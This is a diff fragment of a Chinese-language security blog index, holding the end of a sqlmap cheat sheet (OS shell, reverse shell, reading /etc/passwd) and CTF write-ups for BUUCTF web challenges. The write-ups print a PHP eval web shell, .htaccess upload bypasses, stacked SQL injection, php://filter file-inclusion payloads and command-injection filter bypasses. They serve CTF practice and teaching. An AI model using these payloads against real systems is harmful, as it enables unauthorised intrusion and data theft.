+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>执行系统命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --file /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>统交互shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --os-shell</span><br></pre></td></tr></table></figure>
+
+<p><strong>反弹shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --os-pwn</span><br></pre></td></tr></table></figure>
+
+<p><strong>读取win系统注册表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;   --reg-read</span><br></pre></td></tr></table></figure>
+
+<p><strong>保存进度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;    --dbs-o &quot;sqlmap.log&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>恢复已保存进度</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap/sqlmap.py -u &quot;http://url/news?id=1&quot;    --dbs  -o &quot;sqlmap.log&quot; --resume</span><br></pre></td></tr></table></figure>
+
+<p>3.SQLMAP绕过WAF</p>
+<p>4.SQLMAP提权</p>
+]]></content>
+      <tags>
+        <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dirsearch</title>
     <url>/2023/08/15/dirsearch/</url>
     <content><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h1><span id="more"></span>
@@ -4472,6 +4295,175 @@ tap
 ]]></content>
       <tags>
         <tag>tools</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>buuctf</title>
+    <url>/2023/08/08/buuctf/</url>
+    <content><![CDATA[<h1 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h1><span id="more"></span>
+
+<p>1、后缀名不能有ph！对于文件后缀名的限制，无法绕过这里<br>2、上传类型也太露骨了吧！对Content-Type的限制，修改为image&#x2F;jpeg即可绕过<br>3、诶，别蒙我啊，这标志明显还是php啊</p>
+<p>对上传文件的内容进行了检测，不能含有&lt;?，这里的PHP版本为：PHP&#x2F;5.6.23，可以使用 绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_POST[&#x27;111&#x27;]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是搭建到蚁剑上连接不成功</p>
+<p>上传一个.htaccess文件将别的后缀名文件内容解析为php程序</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .mochu</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805165204744.png" alt="image-20230805165204744"></p>
+<p>然后上传shell即可</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805165102425.png" alt="image-20230805165102425"></p>
+<p>用蚁剑创建数据</p>
+<p>找到根目录下的flag</p>
+<p>![屏幕截图 2023-08-05 150602](D:\Users\陈\Pictures\Screenshots\屏幕截图 2023-08-05 150602.png)</p>
+<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开靶机是一串代码<br>因为html 渲染过程中是不会把\n当做回车展示的，所以右键查看源代码，瞬间舒服了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I put something in F12 for you</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$flag=&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;;</span><br><span class="line">if(isset($_GET[&#x27;gg&#x27;])&amp;&amp;isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id=$_GET[&#x27;id&#x27;];</span><br><span class="line">    $gg=$_GET[&#x27;gg&#x27;];</span><br><span class="line">    if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo &#x27;You got the first step&#x27;;</span><br><span class="line">        if(isset($_POST[&#x27;passwd&#x27;])) &#123;</span><br><span class="line">            $passwd=$_POST[&#x27;passwd&#x27;];</span><br><span class="line">            if (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 if($passwd==1234567)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &#x27;Good Job!&#x27;;</span><br><span class="line">                     highlight_file(&#x27;flag.php&#x27;);</span><br><span class="line">                     die(&#x27;By Retr_0&#x27;);</span><br><span class="line">                 &#125;</span><br><span class="line">                 else</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo &quot;can you think twice??&quot;;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                echo &#x27;You can not get it !&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&#x27;only one way to get the flag&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;You are not a real hacker!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;Please input first&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>
+
+<p>按行显示的题目代码“代码审计”<br>读代码可知拿到flag只需要满足俩条件：<br>1.让以get方式传参的两个变量gg和id满足md5后的值强比较相等，本身的值弱比较不相等<br>2.以post方式传参的变量password不是数字并且与数字1234567弱比较相等<br>由此，在url后追加?id[]&#x3D;1&amp;gg[]&#x3D;2就可以显示“You got the first step”的提示。但passwd参数还没有传，此时需要借助浏览器插件HackBar以post方式传入passwd&#x3D;1234567a<br>以get方式传参并使md5值相等<br>总结：<br>1.给数组类型的变量赋值不同的数值，可以满足变量的md5值在进行强比较时相等，又满足他们自身的值在进行弱比较时不相等。<br>2.在数字后面加个字母，就不再是数字但又可以满足和数字做弱比较时相等。</p>
+<h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>这题目的名字一看就能猜到应该是文件上传了<br>打开靶机链接是这个样子的，我不知道这是什么梗<br>题目网页<br>因为类似的题上一篇已经写过了，这里就简写。这道题也是只能上传非php后缀的文件，然后再上传.htaccess文件，使服务器端将jpg看做php。<br>上传jpg格式的一句话木马：<br>一句话木马</p>
+<p>上传.htaccess时拦截包，修改文件类型为image&#x2F;jpeg：<br>上传.htaccess文件<br>.htaccess里写的内容：SetHandler application&#x2F;x-httpd-php</p>
+<p>上传1.jpg和.htaccess成功后，就可以用中国蚁剑连接了<br>url地址是：靶机的url&#x2F;upload&#x2F;随机生成的一串数&#x2F;1.jpg（即一句话木马文件上传到的路径）<br>密码是写在1.jpg里的111<br>测试连接，显示连接成功，点击添加，在服务器端的根目录可以找到flag</p>
+<h2 id="htaccess是什么"><a href="#htaccess是什么" class="headerlink" title="htaccess是什么"></a>htaccess是什么</h2><p>.htaccess文件(或者”分布式配置文件”）提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</p>
+<p>概述来说，htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
+<p>启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config</p>
+<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
+<h1 id="随便注"><a href="#随便注" class="headerlink" title="随便注"></a>随便注</h1><p>访问url</p>
+<p>重命名+堆叠注入</p>
+<p>1.判断是否存在注入，注入是字符型还是数字型</p>
+<p>输入1’发现不回显</p>
+<p>输入1’#显示正常</p>
+<p>应该是存在sql注入了</p>
+<p>输入1’ or ‘1’&#x3D;’1,正常回显，应该是字符型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;2&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;miaomiaomiao&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(6) &quot;114514&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(2) &quot;ys&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2.猜解SQL查询语句中的字段数</p>
+<p>输入1’ order by 3 # 回显出错，说明有两个字段</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error 1054 : Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>3.显示字段</p>
+<p>输入1′ union select 1,2 # 回显一个正则过滤规则</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
+
+<p>过滤了 select，update，delete，drop，insert，where 和 点</p>
+<p>过滤了这么多词，尝试堆叠注入</p>
+<p>4.查询数据库</p>
+<p>输入1’;show databases;# 成功回显</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(11) &quot;ctftraining&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;information_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;mysql&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(18) &quot;performance_schema&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(9) &quot;supersqli&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;test&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>说明存在堆叠注入</p>
+<p>5.查询表</p>
+<p>输入1’;show tables;# 成功回显</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到两个表words和1919810931114514</p>
+<p>6.查询表中字段</p>
+<p>查看1919810931114514，输入1’; show columns from <code>1919810931114514</code>; #</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到1919810931114514中有我们想要的flag字段</p>
+<p>7.查询另一个表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;hahahah&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]=&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]=&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]=&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]=&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现flag，因为查看flag的回显会出现在words里，为了回显在flag所属的表，而发现alter、rename又没有被过滤，则试着进行表和字段的重命名</p>
+<p>因为可以堆叠查询，这时候就想到了一个改名的方法，把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id(或data)。然后程序查询就能查询到原本‘1919810931114514’表中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br><span class="line">#rename命令用于修改表名。</span><br><span class="line">#rename命令格式：rename table 原表名 to 新表名;</span><br><span class="line">#alert修改字段名及字段属性值</span><br><span class="line">alert table 表名 change 旧字段名 新字段名 新字段属性; </span><br></pre></td></tr></table></figure>
+
+<p>输入1’ or 1&#x3D;’1,查询就得到flag</p>
+<h1 id="Include"><a href="#Include" class="headerlink" title="Include"></a>Include</h1><p>打开页面只有一个a标签的超链接，指向的是?file&#x3D;flag.php。结合题目的名称不难联想到这是一题文件包含的题目。</p>
+<pre><code>看到当?file=flag.php时，页面返回Can you find out the flag。先输入?file=/etc/passwd，确认一下有没有返回，是否真的有文件包含的漏洞。
+</code></pre>
+<p>看到确实存在文件包含漏洞，目前又没有其他的信息。我们不知道真正的flag藏在那个页面中。所以只能先用文件包含漏洞中php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource伪协议帮我们返回已知页面的代码。输入<code>?file=php://filter/convert.base64-encode/resource=index.php</code>就能得到index.php的源代码的base64密文。解密后得到一下内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php://input&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#x27;hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#x27;&lt;a href=&quot;?file=flag.php&quot;&gt;tips&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>大概意思就是过滤了php的几个伪协议，但刚好没过滤我们这个。<br>所以可以我们可以看到返回的结果<br>那现在就取一下flag.php的内容</p>
+<p> 输入?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php就能得到flag.php的源代码的base64密文。解密后得到一下内容里面就有flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">//flag&#123;ace2c6ad-88d7-4c5d-a49e-38baeba72c32&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="Exec"><a href="#Exec" class="headerlink" title="Exec"></a>Exec</h1><p>打开题目就看到大大的PING,二话不说直接ping个本地ip</p>
+<p>涉及知识点：</p>
+<pre><code>在命令执行的过程中，可以通过一些常用特殊字符来执行其他语句
+
+；  //命令分割符，即当执行完第一个命令，继续执行下一个命令
+
+|   //管道
+</code></pre>
+<p>那么尝试在当前文件夹下，有什么东西吧</p>
+<p>构造payload</p>
+<pre><code> 127.0.0.1;ls
+</code></pre>
+<p> 我们都知道在linux系统搭建的页面，通常显示页面的路径是&#x2F;var&#x2F;www&#x2F;html，那么我们尝试返回当前路径查找</p>
+<p>构造payload</p>
+<pre><code> 127.0.0.1;cd ../../../;ls
+</code></pre>
+<p>在返回前三层的时候找到了flag 字样</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<pre><code>127.0.0.1;cd ../../../;cat flag
+</code></pre>
+<p>flag{977043da-6f7d-4f7a-9e8e-2c65837cb657}</p>
+<h1 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h1><p>（1）页面里显示&#x2F;?ip&#x3D;,很明显要以ping的形式传一个参数给ip，并且我们要想执行其他命令，就要用命令分隔符也就是管道符连接，命令分隔符可以用”;“”|“”&amp;”三种，本题经过尝试发现第一步查看目录过滤了|，&amp;和空格。<br>这里介绍两种方式：<br>1.ping本地127.0.0.1<br>2.用||来代替127.0.0.1；<br>（2）虽然找到了放flag的文件，但是尝试后发现都不对，这里介绍一种思路，我们可以通过查看index.php的文件源码来查看源码，从而确认过滤了哪些东西，题目说过滤了命令连接符&amp;，\，空格，*，bash，&lt;&gt;，flag，？，我们得想一些其他方法来绕过<br>（3）要想得到flag了，我们需要绕过过滤掉的东西<br>这里介绍三种可以解决的特殊绕过方式：<br>1.拼接绕过法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>以上是题目给的绕过flag的源码，我们这里需要知道这是正则表达式匹配了ip的值中是否顺序出现了f、l、a、g四个字母。这样一来我们就可以拼接一个flag来绕过了，可以拼接f;lag fl;ag fla;g 但是这里需要注意：本题特殊就特殊在flag的字母顺序要不同（拼接绕过的一个大坑）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y=g;x=fla;$x$y</span><br><span class="line">y=ag;x=fl;$x$y</span><br><span class="line">y=lag;x=f;$x$y</span><br></pre></td></tr></table></figure>
+
+<p>构造payload：&#x2F;?ip&#x3D;||y&#x3D;ag;x&#x3D;fl;cat$IFS$9$x$y.php跑一下查看源码得到flag</p>
+<p>2.内联执行法<br>可以看到代码没有过滤掉符号&#96; 所以可以利用内联执行的方式直接打开flag文件,先执行命令ls，再把ls得到的文件名全部用命令cat打开，构建payload 跑一下，查看源码拿到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;cat$IFS$6`ls`或者/?ip=||cat$IFS$6`ls`</span><br></pre></td></tr></table></figure>
+
+<p>3.sh编码绕过法(base64编码)</p>
+<p>使用方法：echo 命令编码|base64 -d|sh</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh可以换成bash, 但是题目过滤掉了</span><br><span class="line">也可以换成其他的编码形式，这里用base64的</span><br><span class="line">空格用$IFS$6替换掉</span><br><span class="line">cat flag.php 的base64编码为Y2F0IGZsYWcucGhw</span><br></pre></td></tr></table></figure>
+
+<p>构造payload ， 相当于执行命令cat flag.php,查看源码得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=127.0.0.1;echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span><br><span class="line">/?ip=||echo$IFS$6Y2F0IGZsYWcucGhw|base64$IFS$6-d|sh</span><br></pre></td></tr></table></figure>
+
+<h1 id="SUCTF-2019-EasySQL1"><a href="#SUCTF-2019-EasySQL1" class="headerlink" title="[SUCTF 2019]EasySQL1"></a>[SUCTF 2019]EasySQL1</h1><p>1.试试sql注入正常套路<br>（1）先试试1有回显<br>（2）再试试字母a没有回显<br>（3）试试单引号注入<code>1&#39; or &#39;1&#39;=&#39;1</code>,提示不一样，因此猜测这里有注入点<br>（4）试试有多少列,<code>1&#39; order by 4#</code>,还是不成功，因此一般的联合查询在这里不能使用<br>（5）基于时间的盲注和报错注入都需要嵌套联合查询语句来实现，因此可以跳过，直接试试布尔型盲注,<code>1&#39; and length(database())&gt;=1</code>还是不成功<br>2.利用堆叠注入<br>（1）查找所有数据库,1;show databases;#</p>
+<p>（2）查询所有表名,1;show tables;#</p>
+<p>（3）查询Flag表中的列,1;show columns from Flag#,不成功<br>3.接下来是网上的两种解法<br>（1）第一种是猜出了源码<strong>select $_POST[‘query’] || flag from Flag</strong>,<br>sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<br>第一种就按默认没有配置来进行，此时||就是逻辑或<br>||在命令执行中见过，<br>回顾:<br>command1;command2顺序执行<br>command1 || command2<br>如果command1执行失败，则执行command2<br>command1 &amp;&amp; command2<br>如果command1执行成功，则执行command2</p>
+<p>因此只需要将<br>$_POST[‘query’]</p>
+<p>提交的数据换成*,1(如果直接写的话会被报错，且写在后面会失效)<br>解释:<br>sql&#x3D;select.post[‘query’].”||flag from Flag”;（拼接语句）<br>如果$post[‘query’]的数据为  *,1</p>
+<p>sql语句就变成了select *,1||flag from Flag，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。<br>此处的1是临时增加一列，列名为1且这一列的所有值都为1</p>
+<p>执行payload：<code>*,1</code>,得到flag<br>（2）第二种是将||作为字符串连接符，因此需要在语句中更改其配置<br>sql_mode&#x3D;PIPES_AS_CONCAT时即可<br>Payload:<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code><br>拼接完之后：select 1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1||flag from Flag<br>相当于是select 1 from Flag和select flag from Flag,得到flag</p>
+<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>先看一下题目,有注入点，这里怀疑是SQL注入</p>
+<p>先尝试读取一下index.php</p>
+<p>这里使用php伪协议</p>
+<p>payload：</p>
+<p>php:&#x2F;&#x2F;filter:&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
+<p>存在文件包含漏洞，但是这里报错了，分析之后是无法打开流：操作失败</p>
+<p>这里去除php后缀</p>
+<p>payload</p>
+<p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index</p>
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805171203176.png" alt="image-20230805171203176"></p>
+<p>解码之后找到index.php</p>
+<pre><code>&lt;?php
+                $file = $_GET[&#39;category&#39;];
+
+                if(isset($file))
+                &#123;
+                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;
+                        include ($file . &#39;.php&#39;);
+                    &#125;
+                    else&#123;
+                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
+                    &#125;
+                &#125;
+                ?&gt;
+</code></pre>
+<p>传入的category参数必须有woofers,meowers,index才行</p>
+<p>这里构造payload来包含flag.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/index.php?category=woofers/../flag</span><br></pre></td></tr></table></figure>
+
+<p>这里使用的知识点是php:&#x2F;&#x2F;filter伪协议套协议</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.php?category=php://filter/convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\陈\AppData\Roaming\Typora\typora-user-images\image-20230805171429538.png" alt="image-20230805171429538"></p>
+<p>base64解码得CTF{happiness_needs_no_filters}</p>
+]]></content>
+      <tags>
+        <tag>ctf解题</tag>
       </tags>
   </entry>
   <entry>
